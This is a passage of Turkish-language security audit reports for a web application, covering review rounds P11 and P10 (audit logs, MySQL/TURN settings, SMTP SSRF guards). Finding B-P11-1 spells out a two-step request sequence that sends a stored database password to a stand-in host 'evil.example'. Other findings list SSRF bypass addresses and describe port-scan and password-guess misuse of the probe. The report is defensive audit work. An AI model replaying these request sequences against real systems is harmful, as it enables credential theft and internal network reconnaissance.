| B-P11-4 (Düşük) Port tarama / parola deneme oracle'ı      | KISMİ (risk kabulü) → "Sonra" | Global 20/dk kova eklendi (`routes.ts:39`, kişi başı 5/dk'ya ek). Başarısız testte yanıt `latencyMs: null` dönüyor, audit'e süre yazılmıyor (`system.ts:174-176`, contracts `:84`). Risk kabulü `implementation.md:3329`'a yazıldı. Kalan sinyaller: hata sınıfı ve HTTP yanıt süresinin kendisi (anında red ile 10 sn zaman aşımı ayırt edilebiliyor). Bunlar kabul edilen riskin parçası. "Sonra": `rs_mysql_test_failed_total` alarm metriği (devops).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| B-P11-5 (Düşük) İmleçte BIGINT taşması                    | KAPANDI                       | `decodeCursor`, id > 9223372036854775807 ise 400 `fields.cursor` dönüyor (`read.ts:56-66`). Birim ve entegrasyon testi var.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| B-P11-6 (Düşük) Aydınlatma metni sürüm sınırı             | KAPANDI                       | PUT `/settings/consent-text` için tenant başına 10/saat sınırı (`routes.ts:69-76`); 11. istek 429 + `Retry-After` dönüyor. Bellek içi sayaç kullanılıyor (tek instance, ADR-0005); kalıcı tablo büyümesi pratikte sınırlandı.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |

## Otomatik tarama

- `gitleaks v8.30.1 dir /repo --redact --config .gitleaks.toml` → 13 eşleşme. **13'ü de `apps/web/.next/**` altında** (git-ignored derleme çıktısı). `.next` dışında **0** eşleşme var; değerler yazdırılmadı. B-P11-2 sonrası CI'daki git modu gitleaks adımının geçmesi bekleniyor.
- `pnpm audit --audit-level=moderate` (kod turu 1) → açık yok. Bu turda bağımlılık değişikliği yok.

## "Sonra" önerileri (`docs/gereksinimler.md` §9)

- B-P11-3: MySQL testi için "TLS gerekli" seçeneği (`ssl.rejectUnauthorized`, servername). TLS kapalıyken `allowPublicKeyRetrieval` yalnız loopback, özel ağ ya da compose servis adında açılmalı. Atanan: backend-dev.
- B-P11-4: `rs_mysql_test_failed_total` metriği ve alarm eşiği. Atanan: devops.
- I-P11-1 / I-P11-3 (P13): audit'in harici append-only kopyası; `BEFORE INSERT` ile `created_at = SYSDATE(3)` (UTC) zorlanması. Atanan: dba + devops.

---

# Güvenlik Raporu — P11 turu (sistem ayarları, audit ekranı, aydınlatma metni) — Kod turu 1 (2026-11-12)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 1 / Düşük 5 (+ Bilgi 4)

Kapsam: `git diff HEAD` (commit edilmemiş P11). Okunan dosyalar: migration `20261113090000_p11_system_settings_audit` (up/down), `grants.sql`, `check-app-grants.sh`, `audit/{routes,read,repo,view,mask,service}.ts`, `settings/{routes,system,mysql-probe,consent}.ts`, `public/consent.ts`, `signaling/turn.ts`, `lib/{crypto,csv,rate}.ts`, contracts `api/{audit,system-settings}.ts`, web `audit/audit-log.tsx`, `lib/audit/actions.ts`, ci.yml, compose ve test-db.sh. Testler koşulmadı; tetikleyici davranışı `audit-immutability-p11.test.ts` içeriği ve kodla doğrulandı.

## Bulgular (öncelik sırasıyla)

### [ORTA] B-P11-1 Kayıtlı MySQL şifresi iki adımda başka sunucuya gönderilebiliyor — A07/A04 (Insecure Design)

Yer: `apps/server/src/settings/system.ts:92` (PUT, şifre boşken `secretEnc` korunuyor) + `:120-124` (test, hedefi kayıtlı `core` ile karşılaştırıyor)
Sorun: "Şifre başka sunucuya gönderilmez" kuralı, karşılaştırmayı şifrenin girildiği hedefle değil kaydın **güncel** host/port/user değeriyle yapıyor. PUT ise host değiştiğinde şifre boşsa eski şifreyi koruyor. Bu durumda ilk adımda hedef değiştirilir, ikinci adımda test edilir ve kural aşılır.
İstismar senaryosu: Ele geçirilmiş bir Super Admin oturumu ya da kötü niyetli ikinci bir Super Admin `PUT /admin/settings/mysql {host:"evil.example", port:3306, user:"app", database:"x"}` gönderir (şifre yok, `secretEnc` korunur). Ardından `POST /admin/settings/mysql/test` aynı gövdeyle çağrılır: `sameTarget(rec.core)` true döner, gerçek DB şifresi çözülüp `evil.example`'a gönderilir. `allowPublicKeyRetrieval: true` olduğu için sahte sunucu caching_sha2 akışında kendi RSA anahtarını verir ve şifreyi **düz metin** olarak alır. Şifre arayüzde hiç gösterilmediği halde sızmış olur; saldırgan uygulamayı ve audit'i atlayıp doğrudan DB erişimi kazanır. İz olarak yalnız `settings.mysql.updated` ve `settings.mysql.test` audit kayıtları kalır. `settings-p11.test.ts:106` testi yalnız tek adımlı farklı hedefi deniyor.
Düzeltme: (a) PUT'ta host, port veya user kayıttakinden farklıysa ve `password` yoksa 400 `fields.password` dönülmeli (ya da `secretEnc = NULL` yapılmalı; hedef değişince şifre yeniden girilir). (b) Savunma derinliği için hedef AAD'ye bağlanmalı: `aadFor.systemSecret("mysql")` + `:${host}:${port}:${user}`. Böylece hedef değişince kayıtlı şifre çözülemez (`secret_unreadable`). (c) "PUT ile hedef değiştir → şifresiz test → 400 ve probe çağrılmadı" entegrasyon testi eklenmeli. Atanan ajan: backend-dev.

### [DÜŞÜK] B-P11-2 gitleaks, P11 test dosyasındaki sahte değeri yakalıyor; commit sonrası CI düşer — A05

Yer: `apps/server/test/integration/settings-p11.test.ts:15` (`const SECRET = "…"`, kural `generic-api-key`)
Sorun: Değer sahte. Ancak `.gitleaks.toml` allowlist'i yalnız `test/helpers/{app,secrets}.ts` dosyalarını kapsıyor. CI'daki "gitleaks (tüm geçmiş)" adımı (`ci.yml:174-177`) bu dosya commit edilince `exit 1` verir.
Düzeltme: Değer `test/helpers/secrets.ts`'e (sahte secret'ların tek kaynağı, S-P3-5) taşınıp oradan import edilmeli. Allowlist genişletilmemeli. **Commit'ten önce** yapılmalı. Atanan ajan: backend-dev.

### [DÜŞÜK] B-P11-3 MySQL testi TLS'siz ve `allowPublicKeyRetrieval: true` ile bağlanıyor — A02

Yer: `apps/server/src/settings/mysql-probe.ts:53-62`
Sorun: Hedef internet üzerinde gerçek bir sunucu olsa bile bağlantı açık metin. Yoldaki bir MITM, caching_sha2 tam kimlik doğrulamasında kendi açık anahtarını vererek düz şifreyi alabilir. `mysql_native_password` kullanılıyorsa challenge yanıtını yakalayıp çevrimdışı kırabilir.
İstismar senaryosu: Super Admin uzak bir MySQL'i test eder; sunucu ile hedef arasındaki ağda bulunan saldırgan şifreyi ele geçirir.
Düzeltme: Formda "TLS gerekli" seçeneği olmalı (varsayılan açık; `ssl: { rejectUnauthorized: true, servername }`). TLS kapalıyken `allowPublicKeyRetrieval` yalnız loopback, özel ağ veya compose servis adında açılmalı. En azından arayüzde açık metin uyarısı gösterilmeli. "Sonra". Atanan ajan: backend-dev (+ frontend-dev uyarı).

### [DÜŞÜK] B-P11-4 MySQL testi iç ağ port tarama / DB parola deneme oracle'ı (bilinçli host kısıtı yok) — A10 SSRF

Yer: `apps/server/src/settings/mysql-probe.ts:40-48`, `system.ts:146-148`
Sorun: `connect`, `timeout`, `auth` ve `database` sınıfları ile `latencyMs`, sunucunun eriştiği ağda açık, kapalı ya da filtreli port ayrımını ve MySQL varlığını veriyor. `127.0.0.1` ve compose `mysql` hedefleri de serbest. Hız sınırı 5/dk/kullanıcı (`routes.ts:37`); yalnız SUPER_ADMIN erişebiliyor; her deneme audit'e yazılıyor; ham hata yalnız logda; `permitLocalInfile` mariadb 3.5.4'te varsayılan false (doğrulandı, yerel dosya okuma yok).
İstismar senaryosu: Ele geçirilmiş Super Admin hesabıyla saatte 300 hedef taranabilir ya da iç DB kullanıcılarına parola denemesi yapılabilir.
Düzeltme: Kabul edilen risk olarak `implementation.md`/runbook'a yazılmalı. Başarısız denemede `latencyMs` dönülmemeli ya da 1 sn'ye yuvarlanmalı. Hız sınırı global olarak da (tüm Super Admin'ler için ör. 20/saat) uygulanmalı. Alarm metriği `rs_mysql_test_failed_total` eklenmeli. "Sonra". Atanan ajan: backend-dev.

### [DÜŞÜK] B-P11-5 Audit imlecinde int64 taşması 400 yerine sunucu hatası verebilir — A04

Yer: `apps/server/src/audit/read.ts:61-63`
Sorun: `\d{1,19}` en fazla 9999999999999999999 kabul ediyor; bu değer BIGINT sınırını (9223372036854775807) aşıyor. Prisma'nın bu değerde doğrulama hatası (500) fırlatması bekleniyor (test edilmedi). Kapsam ihlali yok: imleç yalnız `scope` + filtre içinde daraltıyor; manipüle edilmiş imleç başka tenant'ın verisini döndürmüyor (`repo.ts:24-32`).
Düzeltme: `BigInt(m[2]) > 9223372036854775807n` ise 400 `fields.cursor` dönülmeli; birim test eklenmeli. Atanan ajan: backend-dev.

### [DÜŞÜK] B-P11-6 Aydınlatma metni sürüm sayısı ve yazım hızı sınırsız — A04

Yer: `apps/server/src/settings/routes.ts:61-65`, `public/consent.ts:119-131`
Sorun: `settings.edit` sahibi, her biri ≤ 20.000 karakter olan sınırsız sayıda sürüm üretebilir. Eski sürümler bilerek silinemediği için kalıcı tablo büyümesi oluşur (değişmeyen gövde sürüm üretmiyor).
Düzeltme: Kullanıcı başına 10/saat ya da tenant başına günlük sürüm sınırı (429) konmalı. "Sonra". Atanan ajan: backend-dev.

## Bilgi (bulgu değil)

- **I-P11-1 Tetikleyiciler migrator'a karşı değil, uygulamaya ve kazaya karşı koruma sağlar.** `migrator` DB üzerinde `ALL … WITH GRANT OPTION` yetkisine sahip (`deploy/mysql/init/01-users.sh`). Bu yetkiyle `DROP TRIGGER`, `TRUNCATE` (DELETE tetikleyicisini atlar) ya da `down.sql` çalıştırabilir. Gerçek değiştirilemezlik için audit'in harici append-only kopyası (P13 yedek/WORM ya da log gönderimi) önerilir. `app` için durum: UPDATE/DELETE/TRIGGER/DDL yok; REPLACE ve ODKU yetki gerektirdiği için reddediliyor; `check-app-grants.sh` bunu root ile doğruluyor.
- **I-P11-2 `--log-bin-trust-function-creators=1`.** Bayrak yalnız binlog güvenlik denetimini (DETERMINISTIC beyanı ve SUPER şartı) gevşetir. Başka bir DEFINER atamak için hâlâ `SET_ANY_DEFINER` gerekir. `app` kullanıcısında CREATE ROUTINE/TRIGGER yok (global, DB ve tablo düzeyi denetlendi), dolayısıyla yetki yükseltme yolu yok. Risk yalnız replikasyon tutarlılığında (tek sunucu, replika yok). 8.4'te değişken deprecated; kaldırılırsa migration 1419 hatasıyla ilk ifadede durur (fail-closed). İmaj digest'le sabitlendiği için sessiz yükseltme olmuyor.
- **I-P11-3 Saat kaynağı.** `SYSDATE(3)` `SET TIMESTAMP`'ten etkilenmiyor. `CONVERT_TZ(…, @@session.time_zone, '+00:00')` oturum saat dilimi değiştirilse de UTC veriyor. Bilinmeyen dilimde NULL dönüyor, COALESCE ile silme reddediliyor (fail-closed). `--sysdate-is-now` yalnız açılışta verilebilen bir seçenek (dinamik değil); compose'da yok ve uyarı yorumu var. P13 notu: `app` `created_at`'i kendisi yazabiliyor; DELETE yetkisi verildiğinde app geri tarihli **sahte** bir satır ekleyip silebilir, gerçek satırı silemez. P13'te `BEFORE INSERT` ile `NEW.created_at = SYSDATE(3)` (UTC) zorlanması önerilir.
- **I-P11-4 TURN.** Secret boş bırakılırsa URL değişse de korunuyor (`system.ts:192`). Secret karşı sunucuya gitmiyor; yalnız istemcilere TTL'li HMAC kimliği veriliyor. Kötü niyetli bir TURN adresi bu kimlikleri TTL boyunca gerçek TURN'de kullanabilir. `stun:` adresleri istemcilerin kendi ağındaki iç adreslere UDP STUN isteği gönderebilir. İkisi de yalnız Super Admin yapabildiği için kabul edilebilir.

## Odak kontrolleri (bulgu yok)

- **Audit değiştirilemezliği (G-15, AC-123):** `audit_logs_no_update` her UPDATE'i (ODKU dahil) SIGNAL ile reddediyor. Retention tetikleyicisi 730 günden yeni satırı reddediyor. `grants.sql`'de app için audit_logs SELECT/INSERT var, DELETE bilerek P13'e bırakılmış. `system_settings` için SELECT/INSERT/UPDATE var, DELETE/DDL yok. `down.sql` guard'ı: geçici tablo CHECK'i (3819) `system_settings` doluyken hiçbir şey değiştirmeden duruyor; REVOKE tablo düşmeden önce yapılıyor.
- **Audit okuma kapsamı:** `auditScope` (`read.ts:35-39`): firma seçmemiş SUPER_ADMIN tüm tenant'ları görüyor; diğer roller yalnız etkin tenant'ı görüyor, tenant yoksa 403. `tenantId` sorgu parametresi yalnız `all` kapsamında uygulanıyor (`read.ts:49`). Her sorguda `tenantId` AND koşulu var (`repo.ts:26`). `userId` filtresi ve `userNames` tenant dışına çıkmıyor. Sıra requireAuth → requirePerm(`audit.view` / `audit.export`). `Cache-Control: no-store` var.
- **Okuma maskesi:** `auditValueView` her satırı yeniden maskeliyor (`mask.ts` kara liste). Dış gönderim eylemlerinde (`mail.*`, `session.email`, `settings.*.test`, `*smtp*`) izinli alan izdüşümü uygulanıyor; `reason` yalnız `[a-z_]{1,40}` sınıfı olarak dönüyor, aksi halde `other`. İç içe nesne düşüyor. Alıcılar yazımda zaten maskeli (`mail/service.ts:186`, `smtp-routes.ts:28`). UI bu kayıtlarda yalnız `reason` gösteriyor. **B-P10 koşulu karşılandı.**
- **405:** `POST/PUT/PATCH/DELETE` istekleri `/audit`, `/audit/export.csv` ve `/audit/:id` için kimlik doğrulamadan önce `Allow` başlığıyla 405 dönüyor. Bilgi sızıntısı yok.
- **CSV (AC-124, G-16):** `csvCell` her hücreye (başlık, JSON ve User-Agent dahil) formül kaçışı uyguluyor (`= + - @ TAB CR`, baştaki boşluk/NBSP ve tam genişlik varyantları dahil), ardından RFC 4180 tırnaklama. 5/dk/kullanıcı limiti var (6. istek 429). Yarım dosya oluşmaması için önce `take: 50001` ile sayılıyor; 50.000'i aşarsa 400. Audit kaydı yazılıyor. Dosya adı sunucuda üretiliyor ve `nosniff` başlığı var.
- **XSS:** Audit detayı `JSON.stringify` çıktısını `<pre>` içinde React metin düğümü olarak basıyor. Aydınlatma metni katılım sayfasında `whitespace-pre-line` metin düğümüyle gösteriliyor (`join-form.tsx:150`). Projede `dangerouslySetInnerHTML` yok. Gövdede kontrol, bidi ve sıfır genişlikli karakterler reddediliyor.
- **Aydınlatma metni bütünlüğü:** app'in `consent_texts` üzerinde yalnız SELECT/INSERT ve sütun bazlı UPDATE(`is_current`, `updated_at`) yetkisi var; body, sha256 ve version değiştirilemez. Onay `id + tenantId + isCurrent` ile bağlanıyor (`consent.ts:61`, `requests/service.ts:266`). Eşzamanlı yayın koşullu `updateMany` ile 409 alıyor. Audit'e gövde değil `{version, sha256}` yazılıyor. Erişim `settings.view/edit` + `tenantScope` ile korunuyor.
- **MySQL ve TURN gizlileri:** AES-256-GCM, satır anahtarına bağlı AAD ile şifreleniyor (mysql↔turn takası çözülmüyor; test `:67`). GET yanıtı yalnız `hasPassword` / `hasSecret` döndürüyor. Audit'te `password` / `secret` → `***`. Probe hatası loga yalnız errno, code ve 300 karakterlik mesaj olarak yazılıyor (şifre yok). `requireSuperAdmin` bütün `/admin/settings` uçlarında preHandler. TURN şeması: `^(stun|turn|turns):[!-~]+$`, en çok 10 tekil adres, secret 32..256 karakter ve `#`/boşluk içermiyor. zod ile DB CHECK birebir uyumlu. Panel ayarı PUT/DELETE sonrası `applyTurn` ile `rooms.turn`'e uygulanıyor. Secret çözülemezse `iceServersFor` yalnız STUN veriyor; kimliksiz TURN verilmiyor (`turn.ts:28`). Açılışta DB okunamazsa env kullanılıyor ve alarm logu düşülüyor.
- **CI ve bağımlılık:** Root parolası CLI argümanında değil, konteyner env'inden (`MYSQL_PWD`) okunuyor. Yeni action eklenmedi; mevcut SHA sabitlemeleri değişmedi. Yeni npm bağımlılığı yok (mariadb, Prisma adaptörünün mevcut bağımlılığı). Yeni env değişkeni yok (`TEST_MIGRATE_DATABASE_URL` yalnız test). test-db.sh imajı digest ile sabitlendi.

## Otomatik tarama çıktıları

- `pnpm audit --audit-level=moderate` → "No known vulnerabilities found".
- `gitleaks v8.30.1 dir /repo --redact --config .gitleaks.toml` → 14 eşleşme, değerler yazdırılmadı. 13 tanesi `apps/web/.next/**` derleme çıktısında (Next preview/prerender anahtarları; `.next` git-ignored, repoya girmez). 1 tanesi `apps/server/test/integration/settings-p11.test.ts:15` (sahte değer, untracked) → B-P11-2.
- `git log --all -- '*.env' '.env*'`: yalnız `.env.example` geçmişi (önceki turlarda doğrulandı, P11'de değişiklik yok).
- P11 dosyalarında `git grep` gizli bilgi kalıbı → eşleşme yok.

## Tasarımda vaat edilip kodda bulunmayanlar

- "Kayıtlı şifre yalnız aynı host/port/kullanıcı için kullanılır; başka sunucuya gönderilmez" (`system-settings.ts:71`, `system.ts:109-111`) iki adımlı akışta sağlanmıyor → B-P11-1.

## Olumlu

- Tetikleyicide SET TIMESTAMP ve time_zone hileleri deneyle bulunup SYSDATE + CONVERT_TZ ile kapatılmış; fail-closed tasarlanmış.
- Okuma tarafında ikinci maske ve dış gönderim izdüşümü var; eski veya elle yazılmış satırlara karşı savunma derinliği sağlıyor.
- CSV formül kaçışı tek modülde, P8 ile ortak.
- DB CHECK'leri zod ile birebir. `value_json`'a gizli alan yazılamıyor (additionalProperties:false).
- Sorunun sınıfı yanıtta, ham hata yalnız logda. Zaman aşımı kesin ve geç gelen bağlantı da kapatılıyor.

Öneri: B-P11-3, B-P11-4 ve B-P11-6 `docs/gereksinimler.md` §9'a "Sonra" olarak eklensin. B-P11-1 ve B-P11-2 P11 kapanmadan düzeltilsin (B-P11-2 commit'i engeller).

---

# Güvenlik Raporu — P10 — Kod turu 3 (2026-11-12, dar kapsam)

DURUM: GEÇTİ
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 0 (+ Bilgi 2). Tur 2'deki B-P10-10 ve B-P10-11 kapandı.

Kapsam: implementation.md "P10 — Backend → Düzeltme turu 2". İncelenen dosyalar: `lib/netguard.ts`, `mail/service.ts`, `auth/{session,guards,routes,service}.ts`, `signaling/ws.ts`, `requests/ws.ts` ve `app.ts`. nodemailer 10.5.0'ın `smtp-transport` ve `smtp-connection` kaynakları da okundu. Testler koşulmadı.

| Bulgu                                                              | Durum   | Doğrulama                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| ------------------------------------------------------------------ | ------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| B-P10-10 (Düşük) DNS hatasında fail-open; IPv6 normalize edilmiyor | KAPANDI | `netguard.ts:117-133`: kendi adı çözülemezse son başarılı çözüm kullanılıyor. Önbellek de yoksa `null` dönüyor ve `resolve` her hedefi reddediyor (`:138`, fail-closed). `canonicalIp` (`:70-75`) IPv6'yı RFC 5952 biçimine, IPv4-mapped adresi IPv4'e çeviriyor. Kanonikleştirme kümeye eklerken (`:121`) ve sorgularken (`:138`) uygulanıyor. `formatIpv6` yalnız ≥2 sıfır grubunu `::` yapıyor; eşitlikte ilk grubu seçiyor. Alarm logu `app.ts` içinde.                                |
| B-P10-11 (Düşük) Tavanda soket kapanmıyor                          | KAPANDI | `mail/service.ts:64-77,124,148`: ham TCP soketi serviste açılıp listeye ekleniyor. Hata ya da tavan aşımında `destroy()` çağrılıyor; bu, üstteki TLS soketini de kapatıyor. TCP bağlantısı daha kurulmadan (SYN askıda) tavan dolarsa da soket listede olduğu için yok ediliyor. Başarılı gönderimde nodemailer `finish` içinde `connection.close()` çağırıyor. Her deneme kendi soket dizisini kullanıyor. Ek `error` dinleyicisi kalıcı olduğu için geç gelen hatalar süreci düşürmüyor. |

## Ek kontroller (bulgu yok)

- **Çözüm ile bağlanma arasında boşluk / rebinding:** `netguard.resolve` tüm adresleri denetliyor ve `ips[0]` adresini döndürüyor. `getSocket`, `netConnect({host: ip})` ile bu IP literaline bağlanıyor; ikinci bir DNS çözümü yapılmıyor. Port bağlanmadan önce allowlist'ten geçiyor (`service.ts:117`). `getSocket` taşıyıcı seçeneklerindeki `host`/`port` değerlerini kullanıyor ve bu değerler yalnız serviste set ediliyor. IPv6 literali `netConnect` ile doğrudan açılıyor.
- **TLS doğrulaması:** Örtük TLS (SSL/465) için `options.connection` ve `secure` birlikteyken nodemailer `_upgradeConnection` çağırıyor (`smtp-connection/index.js:268-281`). STARTTLS'te de aynı fonksiyon çalışıyor (`:1655`). İki yolda da `tls.connect` seçenekleri `this.options.tls` değerinden geliyor; yani `servername` ve `rejectUnauthorized: true` her yolda geçerli (`:1111-1118`). `secured` seçeneği hiçbir yerde verilmiyor, bu yüzden TLS atlanamıyor. `mail-tls-p10` testi örtük TLS'te yanlış ad için reddi doğruluyor.
- **STARTTLS downgrade:** `requireTLS` STARTTLS'i zorunlu kılıyor. Sunucu STARTTLS ilan etmese de komut gönderiliyor (`:1538`); başarısızlık ETLS hatasıyla sonuçlanıyor. EHLO başarısız olursa HELO'ya düşülmüyor (`:1528`). STARTTLS'ten önce gelen açık metin baytları atılıyor (RFC 3207 enjeksiyonu). Güvenlik "Yok" seçiliyken kimlik bilgisi gönderilmiyor (`service.ts:118`).
- **setupEnforced:** Modül global'i kaldırılmış. `app.decorate("mfaSetupEnforced", deps.mfaSetupEnforcement ?? true)` çağrısı (`app.ts:145`) WS eklentileri kaydedilmeden önce yapılıyor. Production'da `false` verilirse hata fırlatılıyor (`:135`). `server.ts:11` bayrağı vermiyor, yani `true` kullanılıyor. `mfaStageOf`, `SessionPolicy.setupEnforced` ve `login` parametreleri zorunlu `boolean`. Bütün çağıranlar `app.mfaSetupEnforced` geçiyor: `guards.ts:46`, `routes.ts:50`, `requests/ws.ts:54`, `signaling/ws.ts:63`. WS yollarında `allowPartial` yok, dolayısıyla yarım oturum `null` dönüyor (`session.ts:116`). `src` altında `false` geçen tek kayıt testlerde var.

## Bilgi (bulgu değil)

- **I-1:** TCP bağlantısı kurulmadan tavan dolup soket yok edilirse nodemailer'ın `getSocket` geri çağrısı hiç çağrılmıyor ve `sending` promise'i sonsuza kadar bekliyor. Promise'e referans kalmadığı için GC topluyor; soket ya da zamanlayıcı sızıntısı yok.
- **I-2:** `mail-tls-p10` testi yalnız örtük TLS'i (465) kapsıyor. `getSocket` ile birlikte STARTTLS (587) üzerinde yanlış sertifika adı ve STARTTLS ilan etmeyen sunucu için birer test eklenmesi önerilir (atanan: backend-dev, "Sonra").

## Otomatik tarama

`gitleaks v8.30.1 dir apps/server/src --config .gitleaks.toml` → `GITLEAKS_EXIT=0`.

---

# Güvenlik Raporu — P10 (hesap güvenliği + SMTP) — Kod turu 2 (2026-11-12)

DURUM: GEÇTİ (Kritik/Yüksek 0; Tur 1'in 2 Orta bulgusu kapandı)
Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 2 (+ Bilgi 3)

Kapsam: Tur 1 düzeltmeleri (implementation.md "P10 — Backend/Frontend → Düzeltme turu 1", mimari-api.md P10 sapma (9)–(13)) ve Tur 1'de incelenmeyen maddeler. Kod okundu. netguard'a gerçek girdilerle deneme yapıldı (node, 34 adres + sahte DNS). Testler koşulmadı.

## Tur 1 bulgularının durumu

| Bulgu                                       | Durum   | Doğrulama                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| ------------------------------------------- | ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| B-P10-1 (Orta) SMTP port / kendi IP / kâhin | KAPANDI | Port allowlist {25,465,587,2525} zod'da (`contracts/api/tenants.ts:145,197`) ve gönderimde de var (`mail/service.ts:93`). `denyHosts` = `PUBLIC_BASE_URL` hostu (`app.ts:164`). Denemede `185.126.217.99`, `[::ffff:185.126.217.99]`, `[::ffff:b97e:d963]` → HOST_NOT_ALLOWED. Kullanıcıya tek mesaj gidiyor. Etkileşimli başarısızlık en az 12 sn sürüyor (`service.ts:148`); hız sınırı 12 sn'lik beklemeden önce sayılıyor (`smtp-routes.ts:20-21`). Kalan iki ayrıntı B-P10-10 ve B-P10-11'de. |
| B-P10-2 (Orta) gitleaks                     | KAPANDI | 7 dizinin hepsinde GITLEAKS_EXIT=0 (aşağıda).                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| B-P10-3                                     | KAPANDI | `app.ts:133` production'da hata fırlatıyor; `security-p10.test.ts:192-195` testi var.                                                                                                                                                                                                                                                                                                                                                                                                              |
| B-P10-4                                     | KAPANDI | `::127.0.0.1`, `::7f00:1`, `2002:7f00:1::`, `64:ff9b::/96`, `64:ff9b:1::/48`, `fec0::1`, `::ffff:0:7f00:1` (SIIT), Teredo `2001:0:…`, `2001:db8::`, `3fff::`, `100::1`, `ff02::1`, `fe80::1%eth0`, `::`, `::1` engellendi. `::ffff:169.254.169.254` gömülü IPv4 kuralıyla engellendi. Genel adresler (`2a01:4f8::1`, `2001:4860:4860::8888`, `::ffff:8.8.8.8`) geçti. `parseIpv6` geçersiz ve fazla uzun girdide null dönüyor; sonuç fail-closed (`isBlockedIp` → true).                           |
| B-P10-5                                     | KAPANDI | Sözleşmede ret var (`tenants.ts:206`). DB'de kalmış eski ayarda gönderim yapılmıyor (`service.ts:94`). UI'da alanlar pasif.                                                                                                                                                                                                                                                                                                                                                                        |
| B-P10-6                                     | KAPANDI | `account.ts:117` `totpSecretEnc: { equals: enc }` koşullu ve `enc` doğrulanan sırrın ham baytı. Bildirim e-postası commit'ten sonra gidiyor.                                                                                                                                                                                                                                                                                                                                                       |
| B-P10-7                                     | KAPANDI | HMAC-SHA-256 kullanılıyor. Anahtar HKDF ile türetiliyor (`info remote-support/recovery-code/v1`, `crypto.ts:65`); şifreleme anahtarı doğrudan kullanılmıyor. Doğrulama tüm sürümlerle yapılıyor (`codeHash IN`).                                                                                                                                                                                                                                                                                   |
| B-P10-8                                     | KAPANDI | AAD zorunlu (`tablo.sütun:<ULID>`). ULID'de `:` olmadığı için bağlam belirsizliği yok. Yanlış AAD veya sürüm baytı → GCM tag hatası → güvenli ret.                                                                                                                                                                                                                                                                                                                                                 |
| B-P10-9                                     | KAPANDI | 2FA sınırı ikiye ayrıldı: hesap+IP 5/5 dk ve hesap geneli 15/15 dk (`account.ts:38-39,67-74`). İkisi de beklemeden önce eşzamanlı sayılıyor. Kilit e-postası kullanıcı başına saatte 1 (`account.ts:40,250`). Çok IP'li saldırganın hesap kilidi G-23'te kabul edilmiş risk.                                                                                                                                                                                                                       |

## Bulgular (öncelik sırasıyla)

### [DÜŞÜK] B-P10-10 netguard kendi-IP engeli DNS hatasında açık kalıyor (fail-open); karşılaştırma IPv6 metnini normalize etmiyor — A10 SSRF

Yer: `apps/server/src/lib/netguard.ts:79-95`
Sorun: (a) `selfIps()` hatayı `ipsOf` içinde yutup `[]` döndürüyor. `PUBLIC_BASE_URL` hostu çözülemezse (geçici DNS hatası) kendi-IP kuralı sessizce devre dışı kalıyor. Bu davranış yorumda da yazılı: "Çözülemezse yalnız diğer kurallar geçerli". Denemede `selfdns-fail` → hedef `185.126.217.99` İZİN verildi. (b) Küme karşılaştırması metin üzerinden yapılıyor ve `canonicalIp` IPv6'yı normalize etmiyor. `[2a01:04f8:0c0c:0001:0000::1]` gibi sıfır dolgulu bir yazım, kendi adresimiz olduğu halde İZİN aldı. Bugün API'den gelen host sözleşmedeki `new URL` ile RFC 5952 biçimine getirildiği için (b)'ye API'den ulaşılamıyor. Bu yalnız derinlemesine savunma açığı.
İstismar senaryosu: Saldırganın sunucunun DNS çözümünü düşürmesi gerekir. Başarırsa hedef yalnız 4 SMTP portuyla sınırlı kalıyor. Olasılık ve etki düşük.
Düzeltme: denyHosts çözümü hata verirse fail-closed olun (HOST_NOT_ALLOWED ya da son başarılı çözümü önbellekte tutun). Kümeye eklerken ve sorgularken IPv6'yı `parseIpv6` baytlarından üretilen kanonik metinle karşılaştırın ya da `BlockList.addAddress` kullanın. Sunucunun IP'si sabitse isteğe bağlı statik bir liste de eklenebilir. (atanan: backend-dev)

### [DÜŞÜK] B-P10-11 12 sn tavanı yanıtı kesiyor ama SMTP soketini kapatmıyor — A04 (kaynak tüketimi)

Yer: `apps/server/src/mail/service.ts:113-126`
Sorun: `Promise.race` 12 sn'de reddediyor ve `finally` içinde `t.close()` çağrılıyor. Ancak nodemailer 10.5.0'da havuzsuz `SMTPTransport.close()` yalnız `emit('close')` yapıyor (`dist/cjs/smtp-transport/index.js:391-396`). Süren bağlantı kapatılmıyor. Selamlamadan sonra yalnız boşta kalma süresi (`socketTimeout` 10 sn) geçerli. Kötü niyetli bir SMTP sunucusu her 9 sn'de bir satır gönderirse (çok satırlı yanıt) soket süresiz açık kalıyor. Bu durum hem etkileşimli hem arka plan (talep bildirimi, kilit/2FA e-postası) gönderimleri için geçerli.
İstismar senaryosu: `settings.edit` yetkili bir tenant Admin'i SMTP olarak kendi damlatan sunucusunu girer. Test ucuyla 5/dk (saatte 300) ve oturum e-postası ile her teknisyen için 20/sa ek bağlantı açar. Bağlantılar birikir; fd/bellek baskısı oluşur ve rs_mail metrikleri yanıltıcı olur. 5/dk sınırı tenant başına; birden çok tenant ile çarpılır.
Düzeltme: Tavan aşılınca soketi gerçekten kapatın. Seçenekler: (1) `getSocket` seçeneğiyle soketi kendiniz açın (netguard IP'sine `net.connect`), tavanda `socket.destroy()` çağırın; (2) `SMTPConnection`'ı doğrudan kullanıp `.close()` ile kapatın. En azından `rs_mail_open_connections` benzeri bir gösterge ekleyin. (atanan: backend-dev)

### [BİLGİ] Anahtar emekliye ayırma kurtarma kodlarını ve TOTP sırlarını geri dönüşsüz bozar

Yer: `apps/server/src/lib/crypto.ts:59-79`
